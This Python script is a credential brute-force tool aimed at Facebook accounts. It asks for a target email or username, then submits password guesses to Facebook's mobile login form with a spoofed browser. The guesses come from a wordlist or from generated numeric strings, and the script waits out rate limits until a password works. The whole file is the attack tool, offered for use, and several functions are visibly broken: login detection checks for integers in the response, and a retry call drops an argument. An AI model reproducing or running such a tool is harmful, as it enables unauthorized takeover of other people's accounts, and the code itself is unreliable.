import itertools
import sys
from time import sleep

import mechanize

CHRS = '0123456789'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' \

class FacebookBruteForceEngine(object):

    LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

    def __init__(self):
        self.browser = self.setup_browser()

    def setup_browser(self):
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        cookies = mechanize.CookieJar()
        browser.set_cookiejar(cookies)
        browser.addheaders = [('User-agent', MOZILLA_UAS)]
        browser.set_handle_refresh(False)
        return browser

    def send_login(self, email, password):
        self.browser.open(self.LOGIN_URL)
        self.browser.select_form(nr=0)
        self.browser.form['email'] = email
        self.browser.form['pass'] = password
        return self.browser.submit().read()

    def is_logged_in(self, data):
        return 2 in data

    def is_too_often(self, data):
        return 1 in data

    def try_password(self, email, password):
        print ('Trying %s' % password)
        data = self.send_login(email, password)

        if self.is_too_often(data):
            print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
            sleep(30)
            self.try_password(password)

        if self.is_logged_in(data):
            print ('Password found: %s' % password )
            sys.exit()

    def run(self, email, password_generator):
        for password in password_generator:
            self.try_password(email, password)


def readline_generator(fp):
    """
    Lazy function (generator) to read a file piece by piece.
    Default chunk size: 1k.
    """
    while True:
        data = fp.readline()
        if not data:
            break
        yield data.strip()

def alphabet_generator(l_start, l_end):
    for n in range(l_start, l_end):
        for xs in itertools.product(CHRS, repeat=n):
            yield ''.join(xs)


email = input('Email address or username to attack:')


try:
    with open(sys.argv[6], 'r') as fp:
        engine = FacebookBruteForceEngine()
        engine.run(email, readline_generator(fp))
except IndexError:
    engine = FacebookBruteForceEngine()
    min_chars = input(
        'Minumum number of characters in password (default: 3):') or 3
    max_chars = input(
        'Maximum number of characters in password (default: 8):') or 8
    engine.run(email, alphabet_generator(int(min_chars), int(max_chars)))
